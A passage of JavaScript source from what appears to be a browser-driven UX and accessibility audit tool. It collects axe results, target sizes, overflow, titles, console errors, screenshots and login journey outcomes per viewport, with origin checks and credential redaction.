  const build = frontmatter.build;
  if (build !== 'dev' && build !== 'prod') {
    throw new CollectError('invalid-manifest', `collect: manifest build must be 'dev' or 'prod', got ${String(build)}`);
  }
  if (!(envMap instanceof Map)) {
    throw new TypeError('collect: envMap must be a Map (loadManifest() returns one)');
  }
  assertLoopback(frontmatter, envMap);

  const measuresNs = await loadMeasures(measures);
  const baseUrl = String(frontmatter['base-url']).replace(/\/+$/, '');
  const viewports = Array.isArray(frontmatter.viewports) ? frontmatter.viewports : [];
  const routes = Array.isArray(frontmatter.routes) ? frontmatter.routes : [];
  const journeys = Array.isArray(frontmatter.journeys) ? frontmatter.journeys : [];
  const personas = Array.isArray(frontmatter.personas) ? frontmatter.personas : [];

  // BV-004: one login persona per run; revisit when a manifest needs a second
  // route persona. Journeys can still name their own credential substitutions.
  let login = null;
  if (frontmatter['login-command'] !== undefined) {
    const command = frontmatter['login-command'];
    if (!command || typeof command !== 'object' || Array.isArray(command)
      || typeof command.persona !== 'string' || command.persona.trim().length === 0
      || !Array.isArray(command.steps) || !command.steps.every((line) => typeof line === 'string')
      || (command.success !== undefined && typeof command.success !== 'string')) {
      throw new CollectError('invalid-login-command', 'login-command needs a persona, string steps and an optional success regex');
    }
    const persona = personas.find((entry) => entry?.name === command.persona);
    if (!persona) throw new CollectError('invalid-login-command', 'login-command persona must name a declared persona');
    let successRe = null;
    if (command.success !== undefined) {
      try {
        successRe = new RegExp(command.success);
      } catch {
        throw new CollectError('invalid-login-command', 'login-command success must be a valid regex');
      }
    }
    for (const line of command.steps) assertStepArgv(splitStepLine(line), { baseUrl });
    login = { persona, steps: command.steps, successRe };
  }
  const waits = frontmatter.wait === undefined ? [] : frontmatter.wait;
  if (!Array.isArray(waits) || !waits.every((line) => typeof line === 'string')) {
    throw new CollectError('invalid-wait', 'wait must be a list of wait commands');
  }
  for (const line of waits) assertWaitStep(line, baseUrl);

  // Every manifest DEFECT is decided here, before a browser exists: a run that
  // dies half-way has already written artefacts and appended nothing to the
  // ledger, which is the worst of both outcomes.
  const routeUrls = new Map();
  for (const viewport of viewports) {
    const name = String(viewport?.name ?? '');
    if (name.trim().length === 0) {
      throw new CollectError('invalid-viewport', 'every viewports[] entry needs a non-empty name');
    }
  }
  for (const route of routes) {
    const routePath = String(route?.path ?? '/');
    routeUrls.set(route, resolveWithinOrigin(baseUrl, routePath, {
      code: 'route-path-off-origin',
      subject: `route ${routePath}`,
    }));
    const verdict = titleMatches('', route?.['title-pattern']);
    if (!verdict.ok) {
      throw new CollectError('invalid-title-pattern', `route ${routePath}: title-pattern is not a valid regular expression`);
    }
  }
  const journeyUrls = new Map();
  for (const journey of journeys) {
    const name = String(journey?.name ?? 'journey');
    journeyUrls.set(journey, resolveWithinOrigin(baseUrl, journey?.start ?? '/', {
      code: 'journey-start-off-origin',
      subject: `journey ${name}`,
    }));
    for (const line of Array.isArray(journey?.steps) ? journey.steps : []) {
      assertStepArgv(splitStepLine(line), { baseUrl });
    }
  }

  const runDir = runDirPath(repoRoot, runId);
  const shotsDir = screenshotsDir(repoRoot, runId);
  const aDir = axeDir(repoRoot, runId);
  const mDir = measuresDir(repoRoot, runId);
  for (const dir of [runDir, shotsDir, aDir, mDir]) fs.mkdirSync(dir, { recursive: true });

  const session = await resolveSession(exec, repoRoot, runId);
  const findings = [];
  const skipped = [];
  const ranViewports = [];
  const ranRoutes = new Set();
  const targetSizeExempt = { inline: 0, hit_area: 0, partial: false };
  let isFirstOpen = true;

  const run = (args) => exec([...args, '--session', session]);
  const relative = (absolute) => path.relative(runDir, absolute);

  try {
    for (const viewport of viewports) {
      const vpName = String(viewport?.name ?? 'viewport');
      const applied = await applyViewport(run, viewport, measuresNs);
      if (!applied.ok) {
        const measureFailed = applied.reason === SKIP_REASONS.MEASURE_FAILED;
        const reason = measureFailed ? SKIP_REASONS.MEASURE_FAILED : SKIP_REASONS.DEVICE_MISMATCH;
        const what = `viewport:${vpName}${measureFailed ? '|eval:viewport-width' : ''}`;
        for (const route of routes) {
          const scope = { kind: 'route', name: String(route?.path ?? '/'), viewport: vpName };
          skipped.push(skipEntry(what, reason, scope));
        }
        for (const journey of journeys) {
          const scope = { kind: 'journey', name: String(journey?.name ?? 'journey'), viewport: vpName };
          skipped.push(skipEntry(what, reason, scope));
        }
        continue;
      }
      ranViewports.push(vpName);
      // Device changes may reset cookies; retention has not been measured.
      if (login) isFirstOpen = await runLogin({ run, login, baseUrl, envMap, resolveCredentials, isFirstOpen });

      for (const route of routes) {
        const routePath = String(route?.path ?? '/');
        const scope = { kind: 'route', name: routePath, viewport: vpName };
        // Clear BEFORE opening so the buffer holds only THIS route's errors;
        // read AFTER the measurements so anything the measuring evals trigger is
        // still attributed to the route that produced it.
        await run(['errors', '--clear']);
        const opened = await run(['open', routeUrls.get(route)]);
        if (opened.code !== 0) {
          if (isFirstOpen) {
            throw new CollectError('base-url-unreachable', `cannot open route ${routePath} — is the build running?`);
          }
          skipped.push(skipEntry(`route:${routePath}|${vpName}`, SKIP_REASONS.ROUTE_UNREACHABLE, scope));
          continue;
        }
        isFirstOpen = false;
        /** A measurement that did not happen is a SKIP, never a silent zero. */
        const measureFailed = (call) => {
          skipped.push(skipEntry(`${routePath}|${vpName}|${call}`, SKIP_REASONS.MEASURE_FAILED, scope));
        };
        const measuredValue = (call, payload) => {
          const value = payload.ok ? (payload.value ?? null) : null;
          if (value === null) measureFailed(call);
          return value;
        };
        if (!await runWaits(run, waits, baseUrl)) {
          measureFailed('wait');
          continue;
        }
        ranRoutes.add(routePath);
        const stem = artefactStem({ route: routePath, viewport: vpName });

        // Command measurements can also return a nested result, including null.
        const titleValue = measuredValue('get:title', readEvalPayload(await run(['get', 'title', '--json'])));
        const title = titleValue === null ? '' : readTitle(titleValue);

        const axePath = path.join(aDir, `${stem}.json`);
        const readyForAxe = readCommandPayload(await run(['eval', AXE_SETTLED_EVAL, '--json'])).ok;
        let axe = null;
        if (readyForAxe) {
          const axeResult = await run(['a11y', '--tags', 'wcag2a,wcag2aa', '--json']);
          fs.writeFileSync(axePath, axeResult.stdout, 'utf8');
          axe = measuredValue('a11y', readEvalPayload(axeResult));
        } else {
          measureFailed('a11y');
        }

        const targetsRead = await evalJson(run, measuresNs.TARGET_SIZE_EVAL);
        const boxes = targetsRead.ok ? targetBoxes(targetsRead.value) : null;
        const targets = boxes === null ? null : targetsRead.value;
        if (boxes === null) measureFailed('eval:target-size');
        else countTargetExemptions(targetSizeExempt, boxes);
        if (targets?.truncated === true || targets?.exempt_budget_exhausted === true) {
          targetSizeExempt.partial = true;
        }
        if (targets?.truncated === true) measureFailed('eval:target-size:truncated');
        const overflow = measuredValue('eval:overflow', await evalJson(run, measuresNs.OVERFLOW_EVAL));
        const errors = measuredValue('errors', readEvalPayload(await run(['errors', '--json'])));

        const measurePath = path.join(mDir, `${stem}.json`);
        fs.writeFileSync(measurePath, `${JSON.stringify({ route: routePath, viewport: vpName, title, targets, overflow }, null, 2)}\n`, 'utf8');

        const fullShot = path.join(shotsDir, `${screenshotName({ route: routePath, viewport: vpName, variant: 'full' })}.png`);
        const foldShot = path.join(shotsDir, `${screenshotName({ route: routePath, viewport: vpName, variant: 'fold' })}.png`);
        const capturedFull = await captureFullPage(run, viewport, fullShot);
        if (!capturedFull) measureFailed('screenshot:full');
        await run(['screenshot', foldShot]);

        const evidence = {
          ...(capturedFull ? { screenshotFull: relative(fullShot) } : {}),
          screenshotFold: relative(foldShot),
          ...(readyForAxe ? { axe: relative(axePath) } : {}),
          measures: relative(measurePath),
        };
        const ctx = { route: routePath, viewport: vpName, build, evidence };
        if (axe !== null) findings.push(...findingsFromAxe(axe, ctx));
        if (targets !== null) {
          findings.push(...findingsFromTargets(targets, { ...ctx, classify: measuresNs.classifyTargetSize }));
        }
        if (overflow !== null) {
          const overflowFinding = findingFromOverflow(overflow, ctx);
          if (overflowFinding) findings.push(overflowFinding);
        }
        if (titleValue !== null) {
          const titleFinding = findingFromTitle(title, route?.['title-pattern'], ctx);
          if (titleFinding) findings.push(titleFinding);
        }
        if (errors !== null) findings.push(...findingsFromErrors(errors, ctx));
      }

      for (const journey of journeys) {
        const outcome = await runJourney({
          run,
          journey,
          viewportName: vpName,
          startUrl: journeyUrls.get(journey),
          baseUrl,
          build,
          personas,
          envMap,
          shotsDir,
          relative,
          resolveCredentials,
          waits,
        });
        findings.push(...outcome.findings);
        if (outcome.skipped) skipped.push(outcome.skipped);
      }
    }
  } finally {
    await exec(['close', '--session', session]);
  }

  findings.sort((a, b) => (a.fingerprint < b.fingerprint ? -1 : a.fingerprint > b.fingerprint ? 1 : 0));
  fs.writeFileSync(
    findingsPath(repoRoot, runId),
    findings.map((finding) => JSON.stringify(finding)).join('\n') + (findings.length > 0 ? '\n' : ''),
    'utf8',
  );

  const runRecord = makeRunRecord({
    runId,
    manifestHash,
    rubricHash,
    build,
    timestamp: now().toISOString(),
    viewports: ranViewports,
    routes: [...ranRoutes],
    targetSizeExempt,
    findings,
    skipped,
  });
  // `run-record.mjs` is the ONLY writer of the ledger (its docblock says so);
  // it re-validates through `makeRunRecord` and owns the mkdir. No cycle: that
  // module imports `./paths.mjs` + `./schema.mjs` only.
  appendRunRecord(repoRoot, runRecord);

  return { runId, runDir, findings, runRecord, skipped, skipSummary: summarizeSkips(skipped) };
}

/** Ask the daemon for a worktree-scoped session name; fall back to the deterministic one. */
async function resolveSession(exec, repoRoot, runId) {
  const probe = await exec(['session', 'id', '--scope', 'worktree', '--prefix', 'uxgrill']);
  const raw = String(probe.stdout ?? '').trim().split('\n').pop()?.trim() ?? '';
  if (probe.code !== 0 || raw.length === 0) return sessionName(repoRoot, runId);
  const sanitized = raw.replace(/[^A-Za-z0-9._-]/g, '-');
  return sanitized.startsWith('uxgrill') ? sanitized : `uxgrill-${sanitized}`;
}

/** UI commands may emit plain text or a JSON envelope, including failure at exit 0. */
function commandSucceeded(result) {
  if (!result || result.code !== 0) return false;
  const parsed = parseEvalOutput(result.stdout);
  const value = parsed.ok ? parsed.value : null;
  return !(value && typeof value === 'object' && 'success' in value && value.success !== true);
}

/** Read journey steps in JSON mode so an unreadable reply is detectable. */
function journeyStepOutcome(result) {
  if (Object.hasOwn(PROCESS_FAILURE_MESSAGES, result?.processFailure)) return 'tool-failed';
  const parsed = parseEvalOutput(result?.stdout);
  if (parsed.value?.success === true && result.code === 0) return 'ok';
  // The CLI can report a UI failure, lose its reply, or emit a daemon error.
  // The observed success condition decides whether the journey succeeded.
  return 'ambiguous';
}

/** Keep readiness declarations narrower than the general journey UI vocabulary. */
function assertWaitStep(line, baseUrl) {
  const argv = splitStepLine(line);
  if (argv[0] !== 'wait') throw new CollectError('invalid-wait', 'wait entries must use the wait verb');
  return assertStepArgv(argv, { baseUrl });
}

/** A failed readiness command invalidates this capture, without exposing command output. */
async function runWaits(run, waits, baseUrl) {
  for (const line of waits) {
    const argv = assertWaitStep(line, baseUrl);
    try {
      if (!commandSucceeded(await run(argv))) return false;
    } catch {
      return false;
    }
  }
  return true;
}

/** Login returns the remaining first-open state; errors never carry argv or credentials. */
async function runLogin({ run, login, baseUrl, envMap, resolveCredentials, isFirstOpen }) {
  let unreachableError = null;
  try {
    const credentials = (resolveCredentials ?? defaultResolveCredentials)(login.persona, envMap);
    for (const line of login.steps) {
      const argv = prepareStepArgv(line, credentials, baseUrl);
      if (argv.length === 0) continue;
      if (!commandSucceeded(await run(argv))) {
        if (argv[0] === 'open' && isFirstOpen) {
          unreachableError = new CollectError('base-url-unreachable', 'cannot open login — is the build running?');
          throw unreachableError;
        }
        throw new CollectError('login-failed', 'login failed');
      }
      if (argv[0] === 'open') isFirstOpen = false;
    }
    if (login.successRe && !await journeySucceeded(run, login.successRe)) {
      throw new CollectError('login-failed', 'login failed');
    }
    return isFirstOpen;
  } catch (error) {
    // Only this locally constructed, value-free error may cross the redaction
    // boundary. Resolvers/exec can throw their own secret-bearing CollectError.
    if (unreachableError !== null && error === unreachableError) throw error;
    // Credential resolvers and browser errors can include secret-bearing text.
    throw new CollectError('login-failed', 'login failed');
  }
}

/** `get title --json` may answer a bare string or `{title: "..."}`. */
function readTitle(payload) {
  if (payload && typeof payload === 'object' && !Array.isArray(payload)) return String(payload.title ?? '');
  return String(payload ?? '');
}

/** `get url --json` may answer a bare string or `{url: "..."}`. */
function readUrl(payload) {
  if (payload && typeof payload === 'object' && !Array.isArray(payload)) return String(payload.url ?? '');
  return String(payload ?? '');
}

/**
 * Run one `eval` and read its payload.
 * @returns {Promise<{ok: true, value: unknown}|{ok: false}>} `{ok: false}` on a
 *   non-zero exit, unparseable stdout, or an envelope with `success: false`
 *   (which arrives at exit 0 — see {@link readCommandPayload}).
 */
async function evalJson(run, script) {
  return readEvalPayload(await run(['eval', String(script ?? ''), '--json']));
}

const SCREENSHOT_GEOMETRY = `({
  width: window.innerWidth, height: window.innerHeight, scale: window.devicePixelRatio,
  pageHeight: Math.max(document.documentElement.scrollHeight, document.body?.scrollHeight ?? 0)
})`;
const MAX_CAPTURE_HEIGHT = 16_384;

/** A tall device capture can wrap to the top once its bitmap exceeds Chromium's texture limit (#2035). */
async function captureFullPage(run, viewport, file) {
  const capture = async () => commandSucceeded(await run(['screenshot', file, '--full']));
  // applyViewport gives an explicit WxH priority over a device profile.
  if (!viewport.device || parseViewport(viewport.viewport)) return capture();
  const { value: original } = await evalJson(run, SCREENSHOT_GEOMETRY);
  if (!original || ![original.width, original.height, original.pageHeight, original.scale]
    .every((n) => Number.isFinite(n) && n > 0)) return false;
  if (original.pageHeight * original.scale <= MAX_CAPTURE_HEIGHT) return capture();
  if (original.pageHeight > MAX_CAPTURE_HEIGHT) return false;

  // Capture at scale 1, then ALWAYS restore the device before returning or rethrowing:
  // a throw inside `finally` would swallow the capture's own error (no-unsafe-finally).
  let captured = false;
  let captureError = null;
  try {
    const resized = await run(['set', 'viewport', String(original.width), String(original.height), '1']);
    if (commandSucceeded(resized)) {
      const { value: actual } = await evalJson(run, SCREENSHOT_GEOMETRY);
      if (actual?.scale === 1 && actual.width === original.width && actual.height === original.height
          && actual.pageHeight === original.pageHeight) captured = await capture();
    }
  } catch (err) {
    captureError = err;
  }
  const restored = await run(['set', 'device', String(viewport.device)]);
  const { value: actual } = await evalJson(run, SCREENSHOT_GEOMETRY);
  if (!commandSucceeded(restored) || actual?.scale !== original.scale
      || actual.width !== original.width || actual.height !== original.height) {
    throw new CollectError('device-restore-failed', 'could not restore device emulation after the full-page screenshot');
  }
  if (captureError) throw captureError;
  return captured;
}

/**
 * Apply one viewport entry and VERIFY it took effect (PRD § 5 device-mismatch risk).
 *
 * Verification is against an EXPECTATION, and there are exactly two sources for
 * one: an explicit `expected-width` on the viewport entry, or {@link DEVICE_WIDTHS}
 * for a device name whose width was measured. With neither, the viewport is
 * SKIPPED (`no-expected-width`) — it is not verified.
 *
 * The previous rule ("differ from the last accepted width") accepted whatever
 * the FIRST viewport measured, since there is no previous width then. That is
 * the PRD § 5 incident verbatim: an unknown device name leaves the previous
 * device in place (measured 2026-09-12), so the run would file desktop captures
 * under a `mobile` label — the exact mislabelling this verification exists to
 * prevent. A viewport that cannot be verified is worth less than no viewport.
 *
 * @returns {Promise<{ok: boolean, width: number|null, reason?: string}>}
 *   `reason` ∈ `no-viewport-spec` | `apply-failed` | `measure-failed` |
 *   `no-expected-width` | `width-mismatch`
 */
async function applyViewport(run, viewport, measuresNs) {
  const size = parseViewport(viewport?.viewport);
  let expected = Number.isFinite(Number(viewport?.['expected-width'])) ? Number(viewport['expected-width']) : null;
  let applyResult;
  if (size) {
    applyResult = await run(['set', 'viewport', String(size[0]), String(size[1])]);
    expected = expected ?? size[0];
  } else if (viewport?.device) {
    applyResult = await run(['set', 'device', String(viewport.device)]);
    expected = expected ?? DEVICE_WIDTHS[String(viewport.device)] ?? null;
  } else {
    return { ok: false, width: null, reason: 'no-viewport-spec' };
  }
  if (applyResult.code !== 0) return { ok: false, width: null, reason: 'apply-failed' };

  const measuredRead = await evalJson(run, measuresNs.VIEWPORT_WIDTH_EVAL);
  if (!measuredRead.ok) return { ok: false, width: null, reason: 'measure-failed' };
  const measuredRaw = measuredRead.value;
  const measured = Number(measuredRaw && typeof measuredRaw === 'object' ? measuredRaw.innerWidth : measuredRaw);
  if (!Number.isFinite(measured)) return { ok: false, width: null, reason: 'measure-failed' };
  if (expected === null) return { ok: false, width: measured, reason: 'no-expected-width' };
  return measured === expected
    ? { ok: true, width: measured }
    : { ok: false, width: measured, reason: 'width-mismatch' };
}

/**
 * Replay one journey on one viewport and return its findings.
 *
 * Credentials: resolved only when the journey names a persona, substituted into
 * step TOKENS (after splitting, so a value containing spaces stays one argv
 * entry) and never written to any artefact — the screenshots are named by step
 * INDEX and the findings carry counts only.
 *
 * `startUrl` is resolved and origin-checked by `collect()` before any browser
 * exists ({@link resolveWithinOrigin}) — this function never turns manifest text
 * into a URL, which is what let an absolute off-origin `start` receive a
 * substituted password.
 *
 * @returns {Promise<{findings: object[], skipped: object|null}>}
 */
async function runJourney({ run, journey, viewportName, startUrl, baseUrl, build, personas, envMap, shotsDir, relative, resolveCredentials, waits }) {
  const name = String(journey?.name ?? 'journey');
  const scope = { kind: 'journey', name, viewport: viewportName };
  const maxSteps = Number(journey?.['max-steps']);
  const steps = Array.isArray(journey?.steps) ? journey.steps : [];
  const successPattern = journey?.success;
  let successRe = null;
  if (successPattern) {
    try {
      successRe = new RegExp(String(successPattern));
    } catch (error) {
      throw new CollectError('invalid-journey-success', `journey ${name}: success is not a valid regex (${error.message})`);
    }
  }

  let credentials = null;
  if (journey?.persona) {
    const persona = personas.find((entry) => entry?.name === journey.persona);
    if (persona) {
      credentials = (resolveCredentials ?? defaultResolveCredentials)(persona, envMap);
    }
  }

  const start = String(journey?.start ?? '/');
  const opened = await run(['open', startUrl]);
  if (opened.code !== 0) {
    // The journey never started, so `success: false` says nothing about the
    // product — filing `journey-failed` here would read as a UX defect and, on
    // the next run, as `fixed` once the page is reachable again.
    return { findings: [], skipped: skipEntry(`journey:${name}`, SKIP_REASONS.ROUTE_UNREACHABLE, scope) };
  }
  if (!await runWaits(run, waits, baseUrl)) {
    return { findings: [], skipped: skipEntry(`journey:${name}`, SKIP_REASONS.MEASURE_FAILED, scope) };
  }
  let stepsRun = 0;
  let success = false;
  let stepFailed = false;
  let skipped = null;
  const shots = [];

  {
    const hardCap = Number.isFinite(maxSteps) ? maxSteps + JOURNEY_STEP_OVERRUN : steps.length;
    for (const [index, line] of steps.entries()) {
      if (stepsRun >= hardCap) break;
      // Re-asserted here, not only in collect()'s pre-flight: a guard that
      // depends on its caller having run another guard is not a guard (BV-002).
      // Validate both before and after single-pass substitution. The second
      // check never includes substituted values in its diagnostics.
      const argv = prepareStepArgv(line, credentials, baseUrl);
      if (argv.length === 0) continue;
      let result;
      try {
        result = await run([...argv, '--json']);
      } catch (error) {
        // Inspect the exception without serializing its possibly secret-bearing argv.
        result = { processFailure: processFailureKind(error) };
      }
      const outcome = journeyStepOutcome(result);
      if (outcome === 'tool-failed') {
        success = await journeySucceeded(run, successRe);
        if (!success) {
          const reason = PROCESS_FAILURE_MESSAGES[result.processFailure];
          const what = `journey:${safeLocatorPart(name)}|${safeLocatorPart(viewportName)}|step ${index + 1} (${argv[0]}): ${reason}`;
          skipped = skipEntry(what, SKIP_REASONS.MEASURE_FAILED, scope);
          break;
        }
      }
      if (outcome === 'ambiguous') stepFailed = true;
      stepsRun += 1;
      const shot = path.join(shotsDir, `${screenshotName({ route: name, viewport: viewportName, variant: `step-${stepsRun}` })}.png`);
      await run(['screenshot', shot]);
      shots.push(relative(shot));
      success ||= await journeySucceeded(run, successRe);
      if (success) break;
    }
  }

  return {
    findings: skipped ? [] : journeyFindings({
      name,
      viewport: viewportName,
      stepsRun,
      maxSteps,
      success,
      stepFailed,
      build,
      evidence: { screenshots: shots, start: redactSpans(start, personaSecretPatterns(credentials, personas, envMap)) },
    }),
    skipped,
  };
}

/** Redact known persona values in free-form journey evidence. */
function personaSecretPatterns(credentials, personas, envMap) {
  const secrets = [
    credentials?.email,
    credentials?.password,
    ...personas.flatMap((persona) => [
      envMap.get(persona?.['login-env-email']),
      envMap.get(persona?.['login-env-password']),
    ]),
  ].filter((value) => typeof value === 'string' && value.length > 0);
  return secrets.flatMap((value) => [
    value,
    JSON.stringify(value).slice(1, -1),
    encodeURIComponent(value.toWellFormed()),
  ]).map((value) => new RegExp(RegExp.escape(value)));
}

/**
 * Substitute the two credential placeholders in ONE argv token. Never logged.
 *
 * Literal, global and single-pass (#1335): a STRING replacement argument
 * expands `$&`, `` $` ``, `$'` and `$$`, which would mangle a password holding
 * them, and `replace(string, …)` hits only the first occurrence. A replacer
 * function's return value is inserted verbatim, and one pass means a value
 * that itself contains a placeholder (an email holding `${LOGIN_PASSWORD}`) is
 * never substituted a second time.
 */
function substituteCredentials(token, credentials) {
  if (!credentials) return token;
  return token.replace(/\$\{LOGIN_(EMAIL|PASSWORD)\}/g, (_, key) =>
    key === 'EMAIL' ? (credentials.email ?? '') : (credentials.password ?? ''),
  );
}

/** Keep substituted credentials in one token and out of options and foreign opens. */
function prepareStepArgv(line, credentials, baseUrl) {
  const raw = assertStepArgv(splitStepLine(line), { baseUrl });
  const argv = raw.map((token) => {
    const substituted = substituteCredentials(token, credentials);
    if (/\$\{LOGIN_(EMAIL|PASSWORD)\}/.test(token) && substituted.startsWith('-')) {
      throw new CollectError('step-credential-option', 'credential placeholder resolves to an option — refusing step');
    }
    return substituted;
  });
  return assertStepArgv(argv, { baseUrl });
}

/** Test the journey `success` pattern against the current URL and the body text. */
async function journeySucceeded(run, successRe) {
  if (!successRe) return false;
  const urlResult = await run(['get', 'url', '--json']);
  const urlRead = readCommandPayload(urlResult);
  if (urlRead.ok && successRe.test(readUrl(urlRead.value))) return true;
  const textResult = await run(['get', 'text', 'body']);
  return textResult.code === 0 && successRe.test(String(textResult.stdout ?? ''));
}
